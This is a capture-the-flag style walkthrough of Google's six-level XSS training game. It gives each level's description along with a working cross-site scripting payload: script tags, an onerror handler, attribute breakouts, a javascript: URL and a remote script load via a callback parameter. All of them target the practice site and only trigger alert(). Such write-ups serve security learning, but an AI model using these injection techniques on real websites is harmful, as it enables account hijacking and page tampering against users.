P.S. You can find the challenges [here](https://xss-game.appspot.com/):

# [1/6]  Level 1: Hello, world of XSS

## Mission Description
This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping. 

Interact with the vulnerable application window below and find a way to make it execute JavaScript of your choosing. You can take actions inside the vulnerable window or directly edit its URL bar.

## Mission Objective
Inject a script to pop up a JavaScript alert() in the frame below. 

Once you show the alert you will be able to advance to the next level.

## Solution
```
<script>alert(1);</script>
```

# [2/6]  Level 2: Persistence is key

## Mission Description
Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully. 

This level shows how easily XSS bugs can be introduced in complex apps.

## Mission Objective
Inject a script to pop up an alert() in the context of the application. 

Note: the application saves your posts so if you sneak in code to execute the alert, this level will be solved every time you reload it.

## Solution
```
<img src="#" onerror="alert(1)" />
```

# [3/6]  Level 3: That sinking feeling...

## Mission Description
As you've seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood. 

The application on this level is using one such hidden sink.

## Mission Objective
As before, inject a script to pop up a JavaScript alert() in the app. 

Since you can't enter your payload anywhere in the application, you will have to manually edit the address in the URL bar below.

## Solution
```
https://xss-game.appspot.com/level3/frame#' onerror='alert(1)' x='
```

# [4/6]  Level 4: Context matters

## Mission Description
Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why.

## Mission Objective
Inject a script to pop up a JavaScript alert() in the application.

## Solution
```
');alert('1
```

# [5/6]  Level 5: Breaking protocol

## Mission Description
Cross-site scripting isn't just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.

## Mission Objective
Inject a script to pop up an alert() in the context of the application.

## Solution
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```

# [6/6]  Level 6: Follow the 🐇

## Mission Description
Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash. 

This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.

## Mission Objective
Find a way to make the application request an external file which will cause it to execute an alert(). 

## Solution
```
https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
```

# Congratulations!
                                                         -oooo:-                                                        
                                                        omhsoosho`                                                      
                                                        Ndo:``:oh-                                                      
                                                        dms+--+ym:                                                      
                                                        -ymhohdh+`                                                      
                                                         `N/`.s.                                                        
                                                          +:  +                                                         
                                                          --  :                                                         
                                                          --  o                                                         
                                                          ..  +                                                         
                                                          ::  s        ..`                                              
                                                .:sssso.  --  +     :syhhyo`                                            
                                ..::::.       `odhhyyhdd. ::  s    .mhhyhhdh.       -:...`                              
                               /dhhhhhhs     .odddhyhdddh+y:  my-syhdhhyhhddy/`   .odhyyhh:                             
                              yNdhyyoyhmo+::+ms/+++//++/odm:  NNmNd+///+++/+ody::omhyssyhdm-                            
                            -sddyyyyyyyoommmmmmdhyyyyyyhddd: `ddmdmdhyssyyhhmmNNNNdhyyyyyhmo-`                          
                        ``-omdyyyssys///shdddddddddmmdddhyy-``yhddddhhhhhdmmmmmmdd/oyssyyyyhmhss-`                      
                     `:ohhdmddhhyyyyyshddddhhyyyyyhddhhyo:-...--shhyysssyyhhdhhhddyyysyyyhdddmNNmyo.                    
                    /hNNmmd/:o+/////:`/osyhhyyys+syyhhyysysooossyyyyyooyyyyyyysyy+./oooooos/:ydNNmNmo.                  
                   +dNmmmmmhoo+///////oossshhyyyyyyyyssoossoosoosssyyyyyyyhsoyyyys/:-..--:/+sdddmmmNMy                  
                  `hNmmdmmdmddddhhhyhysso+.oyssssso-./o:-/+oo++oo--osoooooo..oyyhyyyyyyhhhyhdddmmdmNNN                  
                  `yNmNNhhdmdddhhhyyyyyyys:-......`./+++/:o++oo++/-````..::/+sysysyyyhsshhhydddmmmNNNN                  
                   sMNNNNNNmmdmdhhhhyyyyyyhhssssoo+oo/+//:/+//+:++++ooosyooyssosyyhhyhsshdhdmmNmNmmMMN                  
                   -NNNNNNhmNmdmmmdddddmhhhyyyyssys///+/:://////o+osoo+osoossosyhhdddh+omddmNNmmNmNMMN                  
                   oMNNNNNNNNdydNmmmmmdhydhhsoooodhydhsshys+soyooooosssyhyhymdhdhyddmmmdmNNNNNNmNNNMMM                  
                   yMMNNNMmmNdmmNNNNNNmh/sysyysyhyddmhhyhyhhddyyyhmddhhdmdddmmmdmmmmNNmmmNmNNNNmMNMMMM                  
                  .dMMNNMMNNNmNNNNNNmmNNhsddddNNdmhdmddyyhdhdhdddhdmhhdddhmddmmmNNNNNNNNNNNNNNNNMNMMMM                  
                  :NMMMNMMNMNhhmNNNNmdmNNmhddmdNmmmmmmddddNmdhdhddddmddmmmmmmNdNmdmmNNNmNNNNNdmMMMMMMM                  
                  -mMMMMMNNmNNmNNNNNNNNNNNdmmNmNmNmNmmNNmmNNdhddmmmmNmhhhyohNMNMNmmmmNdmNNMMMNNMMMMMMM                  
                  .dMMMMMMNNNMMMMMNNNNNMNmmmNNNmmmmNNdddmmNNNmmdNNmNNNmmNNNNNNNNNNNNNNNmNNNNNmNMMMMMMM                  
                  :NMMMMMMMMMMMMMMMNmmNMNNNNNNNmmNmNNNNmdmNNNNNNNmNNdmNNMMNMmNNNNNNMMNdmNNNMNmmMMMMMMM                  
                  :NNMMMMMMMMMMMMMMMMNNMNNMNNNMMMNNNNNNmNmdmmmNNNNNNmmNNNNNNNNNNMNNMMMNNNNMMNmMMMMNNMN                  
                  :NMMMNNMMMMMMMMMMMMMNNMMMMNMMMNmNNMNNNNNmhNMNNMNNNMMNMMMMMNNMMNNNMNMMMMNMMNNMMNMNMMM                  
                  `hMMMNdMNNMNNNNNMMNNNNMMMMMMMMNmNMMMMNNNNNNNdmmmMNMMMMMMNNMMNmdNMMNMNNNNMNmmNMNMMMMN                  
                   yMMMMNMMNMNmmNNNMNmddmMMNNNMNNNNNMMNNNNMNNNNNNNmNNNNNNNNNNNNNddNdmdmmNNMNNdMMMMMMMN                  
                   yMMMMNMNMMNNMMNNNNmdmmNMNNdhmMNNNNNNmNMMddddmNNNmNNMMNmNmmmmmNNmmmmNMMMMMMNNNMMMMMN                  
                   yNNNMMNNMMMMMMNNNNNMmmdNNNNNNNNNNNNmNNNNNmNmmNNNNNNNNNNNmNmNNNNNNNNNNNNNMMMNNMMMMMy                  
                   +MMMMMMMMMMMNNNNMMMNNNNmNNNMNMNNMNNmhdNNNNNmNNNmmNNNNNNNNNNNMMNNmNNNNNMNMNMMMMMMMN:                  
                    NMMMMNMMMMMMMNNNNNNdNMNNNNNNmNNNNNNNNNmmhNNNNmdNNNNNNNNNMMNNMNNNNNNNNNMMMMNNMMMNs`                  
                    -sdmNMNNMMMMMNNNNmmmmNNNMNmNMNNNNNNNMNmNNNNNNmmmdmNNNMNmmmmNMNNMNMmmNNMMMNMNmd+-`                   
                      `.ohNNMMNMMNMNNmdmNNNNNNmNMNNMNNNNmNNNmmmNmNMMNNMNNMMNNNNNNNNNNMMMMMMMNNho.`                      
                          :+hdNNNNNNNNNNNNNNmNNNNNNNMNNNmNNNNmMmmmNNNMNNNNNNNNMNNMMMMMNNmdds/-                          
                             `--:+shddmmNmmmmNNNNMNNNMNNNNNNNNNNMMNMMMNNNmNNNMNNNNdh++/-.`                              
                                     `--++osdddddddysNmmhshmmmmmNmddddddho/:++/---                                      
                                                    `-.-. .------.                                 
